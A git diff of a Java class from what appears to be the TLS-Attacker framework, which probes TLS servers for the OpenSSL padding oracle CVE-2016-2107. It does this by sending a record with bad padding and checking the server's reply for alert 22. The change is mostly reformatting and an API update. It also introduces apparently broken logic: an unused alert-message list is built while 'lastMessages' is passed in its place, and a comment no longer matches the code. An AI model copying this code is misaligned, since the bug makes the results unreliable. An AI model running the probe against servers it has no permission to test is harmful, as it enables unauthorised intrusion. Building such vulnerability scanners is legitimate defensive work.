@@ -29,6 +29,7 @@ import de.rub.nds.tlsattacker.tls.util.LogLevel;
 import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
+import de.rub.nds.tlsattacker.tls.workflow.action.ReceiveAction;
 import de.rub.nds.tlsattacker.transport.TransportHandler;
 import java.util.Collections;
 import java.util.LinkedList;
@@ -38,7 +39,7 @@ import org.apache.logging.log4j.Logger;
 
 /**
  * Tests for the availability of the OpenSSL padding oracle (CVE-2016-2107).
- *
+ * 
  * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
  */
 public class Cve20162107 extends Attacker<Cve20162107CommandConfig> {
@@ -48,119 +49,118 @@ public class Cve20162107 extends Attacker<Cve20162107CommandConfig> {
     private final List<ProtocolMessage> lastMessages;
 
     public Cve20162107(Cve20162107CommandConfig config) {
-        super(config);
-        lastMessages = new LinkedList<>();
+	super(config);
+	lastMessages = new LinkedList<>();
     }
 
     @Override
     public void executeAttack(ConfigHandler configHandler) {
-        ProtocolVersion[] versions;
-        if (config.getProtocolVersion() == null) {
-            versions = new ProtocolVersion[]{ProtocolVersion.TLS10, ProtocolVersion.TLS11, ProtocolVersion.TLS12
-            };
-        } else {
-            versions = new ProtocolVersion[]{config.getProtocolVersion()};
-        }
-        List<CipherSuite> ciphers = new LinkedList<>();
-        if (config.getCipherSuites().isEmpty()) {
-            for (CipherSuite cs : CipherSuite.getImplemented()) {
-                if (cs.isCBC()) {
-                    ciphers.add(cs);
-                }
-            }
-        } else {
-            ciphers = config.getCipherSuites();
-        }
+	ProtocolVersion[] versions;
+	if (config.getProtocolVersion() == null) {
+	    versions = new ProtocolVersion[] { ProtocolVersion.TLS10, ProtocolVersion.TLS11, ProtocolVersion.TLS12 };
+	} else {
+	    versions = new ProtocolVersion[] { config.getProtocolVersion() };
+	}
+	List<CipherSuite> ciphers = new LinkedList<>();
+	if (config.getCipherSuites().isEmpty()) {
+	    for (CipherSuite cs : CipherSuite.getImplemented()) {
+		if (cs.isCBC()) {
+		    ciphers.add(cs);
+		}
+	    }
+	} else {
+	    ciphers = config.getCipherSuites();
+	}
 
-        for (ProtocolVersion pv : versions) {
-            for (CipherSuite cs : ciphers) {
-                config.setProtocolVersion(pv);
-                config.setCipherSuites(Collections.singletonList(cs));
-                executeAttackRound(configHandler);
-            }
-        }
+	for (ProtocolVersion pv : versions) {
+	    for (CipherSuite cs : ciphers) {
+		config.setProtocolVersion(pv);
+		config.setCipherSuites(Collections.singletonList(cs));
+		executeAttackRound(configHandler);
+	    }
+	}
 
-        if (vulnerable) {
-            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "VULNERABLE");
-        } else {
-            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT VULNERABLE");
-        }
+	if (vulnerable) {
+	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "VULNERABLE");
+	} else {
+	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT VULNERABLE");
+	}
 
-        LOGGER.debug("All the attack runs executed. The following messages arrived at the ends of the connections");
-        for (ProtocolMessage pm : lastMessages) {
-            LOGGER.debug("----- NEXT TLS CONNECTION WITH MODIFIED APPLICATION DATA RECORD -----");
-            LOGGER.debug("Last protocol message in the protocol flow");
-            LOGGER.debug(pm.toString());
-        }
+	LOGGER.debug("All the attack runs executed. The following messages arrived at the ends of the connections");
+	for (ProtocolMessage pm : lastMessages) {
+	    LOGGER.debug("----- NEXT TLS CONNECTION WITH MODIFIED APPLICATION DATA RECORD -----");
+	    LOGGER.debug("Last protocol message in the protocol flow");
+	    LOGGER.debug(pm.toString());
+	}
     }
 
     private void executeAttackRound(ConfigHandler configHandler) {
-        LOGGER.info( "Testing {}, {}", config.getProtocolVersion(), config.getCipherSuites().get(0));
+	LOGGER.info("Testing {}, {}", config.getProtocolVersion(), config.getCipherSuites().get(0));
 
-        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
-        TlsContext tlsContext = configHandler.initializeTlsContext(config);
-        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
+	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
+	TlsContext tlsContext = configHandler.initializeTlsContext(config);
+	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 
-        WorkflowTrace trace = tlsContext.getWorkflowTrace();
+	WorkflowTrace trace = tlsContext.getWorkflowTrace();
 
-        FinishedMessage finishedMessage = (FinishedMessage) trace.getFirstHandshakeMessage(HandshakeMessageType.FINISHED);
-        Record record = createRecordWithBadPadding();
-        finishedMessage.addRecord(record);
+	FinishedMessage finishedMessage = (FinishedMessage) trace
+		.getFirstConfiguredHandshakeMessage(HandshakeMessageType.FINISHED);
+	Record record = createRecordWithBadPadding();
+	finishedMessage.addRecord(record);
 
-        // Remove last two server messages (CCS and Finished). Instead of them,
-        // an alert will be sent.
-        int size = trace.getProtocolMessages().size();
-        trace.remove(size - 1);
-        trace.remove(size - 2);
+	// Remove last two server messages (CCS and Finished). Instead of them,
+	// an alert will be sent.
+	AlertMessage alertMessage = new AlertMessage();
 
-        AlertMessage allertMessage = new AlertMessage(ConnectionEnd.SERVER);
-        trace.getProtocolMessages().add(allertMessage);
+	ReceiveAction action = (ReceiveAction) (trace.getLastMessageAction());
+	List<ProtocolMessage> messages = new LinkedList<>();
+	messages.add(alertMessage);
+	action.setConfiguredMessages(lastMessages);
+	try {
+	    workflowExecutor.executeWorkflow();
+	} catch (WorkflowExecutionException ex) {
+	    LOGGER.info("Not possible to finalize the defined workflow: {}", ex.getLocalizedMessage());
+	}
 
-        try {
-            workflowExecutor.executeWorkflow();
-        } catch (WorkflowExecutionException ex) {
-            LOGGER.info("Not possible to finalize the defined workflow: {}", ex.getLocalizedMessage());
-        }
+	ProtocolMessage lm = trace.getLastConfiguredProtocolMesssage();
+	lastMessages.add(lm);
+	tlsContexts.add(tlsContext);
 
-        ProtocolMessage lm = trace.getLastProtocolMesssage();
-        lastMessages.add(lm);
-        tlsContexts.add(tlsContext);
+	if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
+	    AlertMessage am = ((AlertMessage) lm);
+	    LOGGER.info("  Last protocol message: Alert ({},{}) [{},{}]", AlertLevel.getAlertLevel(am.getLevel()
+		    .getValue()), AlertDescription.getAlertDescription(am.getDescription().getValue()), am.getLevel()
+		    .getValue(), am.getDescription().getValue());
+	} else {
+	    LOGGER.info("  Last protocol message: {}", lm.getProtocolMessageType());
+	}
 
-        if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
-            AlertMessage am = ((AlertMessage) lm);
-            LOGGER.info("  Last protocol message: Alert ({},{}) [{},{}]",
-                    AlertLevel.getAlertLevel(am.getLevel().getValue()),
-                    AlertDescription.getAlertDescription(am.getDescription().getValue()),
-                    am.getLevel().getValue(), am.getDescription().getValue());
-        } else {
-            LOGGER.info("  Last protocol message: {}", lm.getProtocolMessageType());
-        }
-        
-        if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT && ((AlertMessage) lm).getDescription().getValue() == 22) {
-            LOGGER.info("  Vulnerable");
-            vulnerable = true;
-        } else {
-            LOGGER.info("  Not Vulnerable / Not supported");
-        }
+	if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT
+		&& ((AlertMessage) lm).getDescription().getValue() == 22) {
+	    LOGGER.info("  Vulnerable");
+	    vulnerable = true;
+	} else {
+	    LOGGER.info("  Not Vulnerable / Not supported");
+	}
 
-        transportHandler.closeConnection();
+	transportHandler.closeConnection();
     }
 
     private Record createRecordWithBadPadding() {
-        byte[] plain = new byte[]{(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
-            (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
-            (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
-            (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
-            (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
-            (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
-            (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
-            (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
-            (byte) 255, (byte) 255, (byte) 255};
-        Record r = new Record();
-        ModifiableByteArray plainData = new ModifiableByteArray();
-        VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
-        plainData.setModification(modifier);
-        r.setPlainRecordBytes(plainData);
-        return r;
+	byte[] plain = new byte[] { (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+		(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+		(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+		(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+		(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+		(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+		(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+		(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+		(byte) 255 };
+	Record r = new Record();
+	ModifiableByteArray plainData = new ModifiableByteArray();
+	VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
+	plainData.setModification(modifier);
+	r.setPlainRecordBytes(plainData);
+	return r;
     }
 }
